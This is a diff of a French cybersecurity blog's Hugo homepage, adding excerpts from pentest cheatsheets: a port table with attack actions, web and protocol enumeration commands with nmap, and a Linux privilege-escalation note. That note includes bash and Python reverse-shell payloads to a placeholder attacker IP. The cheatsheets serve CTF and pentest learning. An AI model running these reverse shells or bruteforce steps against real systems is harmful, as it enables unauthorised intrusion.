@@ -1,8 +1,8 @@
 <!DOCTYPE html>
-<html lang="en" dir="auto" data-theme="dark">
+<html lang="fr" dir="auto" data-theme="dark">
 
 <head>
-	<meta name="generator" content="Hugo 0.159.2"><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+	<meta name="generator" content="Hugo 0.159.2"><script src="/shingsi/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=shingsi/livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="noindex, nofollow">
@@ -10,17 +10,17 @@
 
 <meta name="description" content="">
 <meta name="author" content="">
-<link rel="canonical" href="http://localhost:1313/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.199042e659bc7245f5609d333d6c044eb554a0640849bb874e1dff8eb0f57209.css" integrity="sha256-GZBC5lm8ckX1YJ0zPWwETrVUoGQISbuHTh3/jrD1cgk=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<link rel="canonical" href="http://localhost:1313/shingsi/">
+<link crossorigin="anonymous" href="/shingsi/assets/css/stylesheet.e89e7af70eb9102beb31bdbfad88d5aff85ffa1e897632cc684c32d65f5bc528.css" integrity="sha256-6J569w65ECvrMb2/rYjVr/hf&#43;h6JdjLMaEwy1l9bxSg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/shingsi/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/shingsi/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/shingsi/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:1313/shingsi/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:1313/shingsi/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/index.xml" title="rss">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/">
+<link rel="alternate" type="application/rss+xml" href="http://localhost:1313/shingsi/index.xml" title="rss">
+<link rel="alternate" hreflang="fr" href="http://localhost:1313/shingsi/">
 <noscript>
     <style>
         #theme-toggle,
@@ -41,7 +41,7 @@
     <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="Shingsi (Alt + H)">Shingsi</a>
+            <a href="http://localhost:1313/shingsi/" accesskey="h" title="Shingsi (Alt + H)">Shingsi</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -67,12 +67,22 @@
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/posts/" title="Posts">
-                    <span>Posts</span>
+                <a href="http://localhost:1313/shingsi/cheatsheet/" title="Cheatsheet">
+                    <span>Cheatsheet</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/tags/" title="Tags">
+                <a href="http://localhost:1313/shingsi/projets/" title="Projets">
+                    <span>Projets</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/shingsi/rapports/" title="Rapports">
+                    <span>Rapports</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/shingsi/tags/" title="Tags">
                     <span>Tags</span>
                 </a>
             </li>
@@ -82,10 +92,10 @@
 <main class="main"> 
 <article class="first-entry home-info">
     <header class="entry-header">
-        <h1>Salut, c&rsquo;est Shingsi 👋</h1>
+        <h1>Bienvenue</h1>
     </header>
     <div class="entry-content">
-        Bienvenue sur mon blog. Ici je partage mes aventures en cybersécurité.
+        Rapports, cheatsheet et retours d&rsquo;expérience liés au domaine de la cyber
     </div>
     <footer class="entry-footer">
         <div class="social-icons" >
@@ -96,20 +106,80 @@
 
 <article class="post-entry"> 
   <header class="entry-header">
-    <h2 class="entry-hint-parent">Test
+    <h2 class="entry-hint-parent">Ports
     </h2>
   </header>
   <div class="entry-content">
-    <p>Introduction coucou
-</p>
+    <p> Port Service Description Action Prioritaire (Pentest) 21 FTP Transfert de fichiers (souvent non chiffré). Tester anonymous login / Sniffing. 22 SSH Accès sécurisé à distance (Ligne de commande). Bruteforce / Chercher clés privées. 23 Telnet Ancêtre du SSH, tout passe en clair. Sniffer les identifiants sur le réseau. 25 SMTP Envoi de courriers électroniques. Énumérer utilisateurs (VRFY). 53 DNS Résolution de noms de domaine en IP. Tester le transfert de zone AXFR. 80 HTTP Protocole web de base (non chiffré). Fuzzing répertoires / Check versions. 88 Kerberos Authentification réseau (Active Directory). Attaques AS-REP &amp; Kerberoasting. 110 POP3 Récupération de mails (non chiffré). Bruteforce d’identifiants. 139 NetBIOS Session de service pour partage de fichiers. Souvent lié au port 445 (SMB). 161 SNMP Gestion et monitoring d’équipements. Bruteforce Community String. 389 LDAP Annuaire d’utilisateurs et d’objets. Énumération d’utilisateurs/groupes. 443 HTTPS Web sécurisé via SSL/TLS. Analyse Certificat (Subdomain leak). 445 SMB Partage de fichiers/imprimantes (Windows). Null Session / Partages ouverts. 1433 MSSQL Base de données Microsoft SQL Server. Tester sa / Injections SQL. 2049 NFS Partage de fichiers (Unix/Linux). Lister les dossiers partagés. 3306 MySQL Base de données Open Source (Web). Accès distant sans MDP / SQLi. 3389 RDP Bureau à distance Windows (GUI). Tester BlueKeep / Bruteforce. 5432 Postgre Base de données SQL avancée. Tester postgres:postgres. 5900 VNC Contrôle de bureau à distance. Tester l’absence de mot de passe. 8080 HTTP-Alt Port alternatif (Serveurs Web/Admin). Chercher Tomcat, Jenkins, APIs. </p>
   </div>
-  <footer class="entry-footer"><span title='2026-04-02 10:25:15 +0200 CEST'>April 2, 2026</span></footer>
-  <a class="entry-link" aria-label="post link to Test" href="http://localhost:1313/posts/test/"></a>
+  <footer class="entry-footer"><span title='2026-04-03 04:33:34 +0200 CEST'>3 avril 2026</span></footer>
+  <a class="entry-link" aria-label="post link to Ports" href="http://localhost:1313/shingsi/cheatsheet/ports/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Méthodo Pentestweb
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>1. Reconnaissance &amp; Fingerprinting Identifier les technologies pour réduire le périmètre de recherche.
+Identification des technos Wappalyzer (Extension navigateur) : Voir le serveur, le langage (PHP, JS, Python) et le CMS. WhatWeb : Version ligne de commande. whatweb &lt;URL&gt; Fichiers Sensibles /robots.txt : Répertoires “cachés” par l’admin. /sitemap.xml : Liste des pages indexées. /.git : Si présent, permet souvent de récupérer tout le code source. 2. Énumération de contenu (Fuzzing) Trouver des pages ou des paramètres que l’on ne voit pas à l’œil nu.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-04-03 04:17:21 +0200 CEST'>3 avril 2026</span></footer>
+  <a class="entry-link" aria-label="post link to Méthodo Pentestweb" href="http://localhost:1313/shingsi/cheatsheet/pentestweb/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Protocoles
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Cette cheatsheet regroupe les vecteurs d’attaque et commandes d’énumération pour les services les plus courants rencontrés en CTF et en environnement réel.
+FTP (21) - File Transfer Protocol Protocole de transfert de fichiers non chiffré. Très courant pour l’exfiltration ou la récupération de configurations.
+Actions Prioritaires Connexion Anonyme : Tester si l’utilisateur anonymous avec un mot de passe vide (ou anonymous) est accepté. Exploration : Lister récursivement tous les fichiers accessibles. Commandes Utiles # Vérification via Nmap nmap --script ftp-anon,ftp-syst -p 21 &lt;IP&gt; # Connexion manuelle ftp &lt;IP&gt; # Login: anonymous | Password: (vide) # Lister tout récursivement (une fois connecté) ls -R SSH (22) - Secure Shell Accès sécurisé en ligne de commande. Difficile à attaquer directement sauf si des versions obsolètes ou des clés privées sont trouvées.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-04-03 03:33:13 +0200 CEST'>3 avril 2026</span></footer>
+  <a class="entry-link" aria-label="post link to Protocoles" href="http://localhost:1313/shingsi/cheatsheet/protocoles/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Privesclinux
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Reverse Shells Listener (Machine Attaquante) nc -lvnp &lt;PORT&gt; Payloads (Machine Victime) bash
+bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1 python
+python3 -c &#39;import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;&lt;IP&gt;&#34;,&lt;PORT&gt;));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&#34;/bin/bash&#34;)&#39; Stabilisation du Shell (TTY) Indispensable pour avoir l’auto-complétion, les flèches et le CTRL&#43;C.
+Dans le shell distant : python3 -c &#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39; Faire CTRL&#43;Z (met le shell en pause). Dans mon terminal : stty raw -echo; fg Dans le shell distant (qui revient au premier plan) : reset export TERM=xterm-256color export SHELL=bash Transfert de fichiers Pour envoyer des fichiers vers la cible.
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-04-03 03:31:43 +0200 CEST'>3 avril 2026</span></footer>
+  <a class="entry-link" aria-label="post link to Privesclinux" href="http://localhost:1313/shingsi/cheatsheet/privesclinux/"></a>
+</article>
+
+<article class="post-entry"> 
+  <header class="entry-header">
+    <h2 class="entry-hint-parent">Enumeration
+    </h2>
+  </header>
+  <div class="entry-content">
+    <p>Nmap TCP Scan Scan complet des services avec scripts par défaut.
+nmap -sC -sV -p- &lt;IP&gt; -v UDP Scan Scan des ports UDP les plus courants (nécessite sudo).
+sudo nmap -sU -sV -F &lt;IP&gt; Attention les scan UDP sont longs
+Options et Modificateurs Option Fonction Utilité -p- Tous les ports Scanne de 1 à 65535 (indispensable) -F Mode rapide Top 100 ports uniquement -sC Scripts par défaut Détecte les vulnérabilités basiques -sV Versions Identifie la version précise du service -sU Scan UDP Pour DNS, SNMP, DHCP, etc. -Pn No Ping Ignore si l’hôte répond au ping (pare-feu) -T4 Vitesse (0-5) 4 est le meilleur compromis rapidité/fiabilité -v Verbose Affiche les ports trouvés en temps réel -oN file Output Sauvegarde le résultat dans un fichier texte -A Agressif Raccourci pour : -sV -sC -O --traceroute --max-retries Limite d’essais Réduire pour accélérer sur réseau instable Web Fuzzing Gobuster exploration de contenu
+...</p>
+  </div>
+  <footer class="entry-footer"><span title='2026-04-03 01:28:30 +0200 CEST'>3 avril 2026</span></footer>
+  <a class="entry-link" aria-label="post link to Enumeration" href="http://localhost:1313/shingsi/cheatsheet/enumeration/"></a>
 </article>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2026 <a href="http://localhost:1313/">Shingsi</a></span> · 
+        <span>&copy; 2026 <a href="http://localhost:1313/shingsi/">Shingsi</a></span> · 
 
     <span>
         Powered by
